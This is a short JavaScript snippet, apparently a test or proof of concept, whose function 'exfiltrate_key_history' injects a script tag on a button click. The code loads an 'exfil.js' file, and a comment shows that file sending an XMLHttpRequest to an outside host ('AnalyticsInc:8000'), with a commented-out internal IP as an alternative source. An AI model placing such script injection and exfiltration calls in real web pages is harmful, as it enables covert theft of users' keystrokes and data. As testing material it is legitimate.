function exfiltrate_key_history() {

    // Remote Source - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	//var URL = 'http://172.25.87.15:8000/exfil.js';
	var URL = './exfil.js';
    var script = document.createElement("script");
    script.setAttribute('src', URL);
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;


/*
exfil.js contents:

xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=remote", true);
xmlhttp.send(null);

*/
